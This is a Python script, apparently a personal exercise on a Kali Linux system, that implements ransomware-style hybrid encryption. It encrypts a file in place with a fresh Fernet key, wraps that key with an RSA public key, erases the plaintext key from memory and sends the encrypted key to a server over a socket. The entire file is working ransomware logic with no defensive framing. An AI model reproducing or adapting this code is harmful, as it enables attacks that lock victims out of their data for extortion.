import socket
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.fernet import Fernet
import gc

# File paths
PUBLIC_KEY_PATH = "/home/kali/allan_python/cryptography/public_key.key"
FILE_TO_ENCRYPT = "/home/kali/allan_python/cryptography/ransom/plan.txt"

# Generate a symmetric key
symmetric_key = Fernet.generate_key()
fernet_instance = Fernet(symmetric_key)

# Load the public key
with open(PUBLIC_KEY_PATH, "rb") as key_file:
    public_key = serialization.load_pem_public_key(key_file.read(), backend=default_backend())

# Encrypt the symmetric key using the public key
encrypted_symmetric_key = public_key.encrypt(
    symmetric_key,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Save the encrypted symmetric key to a file and return its path
def save_encrypted_key(encrypted_key):
    encrypted_key_path = "/home/kali/allan_python/cryptography/encryptedSymmetricKey.key"
    with open(encrypted_key_path, "wb") as key_file:
        key_file.write(encrypted_key)
    return encrypted_key_path

# Send the encrypted symmetric key to the server
def send_encrypted_key_to_server(hostname, port, eKeyFilePath):
    with socket.create_connection((hostname, port)) as sock:
        with open(eKeyFilePath, "rb") as file:
            sock.sendall(file.read())  # Send the encrypted symmetric key
        print("Encrypted symmetric key sent to server.")

# Encrypt the file
with open(FILE_TO_ENCRYPT, "rb") as file:
    file_data = file.read()
encrypted_data = fernet_instance.encrypt(file_data)
with open(FILE_TO_ENCRYPT, "wb") as file:
    file.write(encrypted_data)

# Explicitly delete the symmetric key from memory
del symmetric_key
del fernet_instance
gc.collect()

# Save the encrypted symmetric key to a file
encrypted_key_path = save_encrypted_key(encrypted_symmetric_key)

# Send the encrypted symmetric key to the server
hostname = "127.0.0.1"
port = 8000
send_encrypted_key_to_server(hostname, port, encrypted_key_path)
